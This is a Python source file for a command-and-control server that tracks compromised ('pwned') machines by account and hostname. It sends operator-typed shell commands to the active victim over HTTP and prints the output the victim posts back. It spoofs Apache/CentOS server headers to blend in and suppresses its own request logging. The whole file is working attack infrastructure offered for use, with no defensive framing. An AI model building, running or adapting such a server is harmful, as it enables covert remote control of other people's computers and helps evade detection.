# Command and Control server code

from http import server
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, BIND_ADDR

class C2Handler(BaseHTTPRequestHandler):
    """This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP requests that arrive at the c2 server."""

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that
        arrive at the c2 server."""

        # These variables must be global as they will often be updated via multiple sessions
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):

            # Split out the client account name
            client = self.path.split(CMD_REQUEST)[1]

            # Split out the client account name
            client_account = client.split("@")[0]

            # Split out the client hostname name
            client_hostname = client.split("@")[1]

            # If the client is not in pwned_dict, add it to pwned_dict and increment pwned_id
            if client not in pwned_dict.values():

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

                # Increment our pwned_id and add the client to pwned_dict using pwned_id as the key
                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # If the client is in pwned_dict, and it is also our active session:
            elif client == pwned_dict[active_session]:

                # Collect the command to run on the client; set Linux style promt as well
                command = input(f"{client_account}@{client_hostname}: ")

                # Write the command back to the client as a response; must utf-8 encode
                self.http_response(200)
                self.wfile.write(command.encode())

            # The client is in pwned_dict, but it is not our active session:
            else:

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

    # noinspection PyPep8Naming
    def do_POST(self):
        """ This method handles all HTTP POST requests that
        arrive at the c2 server."""

        # Follow this code block when the compromised computer is requesting a command
        if self.path == RESPONSE_PATH:
                
             # Sends the HTTP response code and header back to the client
            self.http_response(200)

            # Get Content-Length value from HTTP Headers
            content_length = int(self.headers.get("Content-Length"))

            # Gather the client's data by reading in the HTTP POST data
            client_data = self.rfile.read(content_length)

            # UTF-8 decode the client's data
            client_data = client_data.decode()
        
            # Remove the HTTP POST variable and the equal sign from the client's data
            client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

            # HTML/URL decode the client's data and translate "+" to a space
            client_data = unquote_plus(client_data)
            print(client_data)


    def http_response(self, code: int):
        """ Function that sends the HTTP response code and headers back to the client."""
        self.send_response(code)
        self.end_headers()

    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
        return
        # return super().log_request(code, size)()

# This maps to the client that we have a promt for
active_session = 1

# This is the account from the client belonging to the active session
client_account = ""

# This is the hostname from the client belonging to the active session
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# Instantiate oour HTTPServer object
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()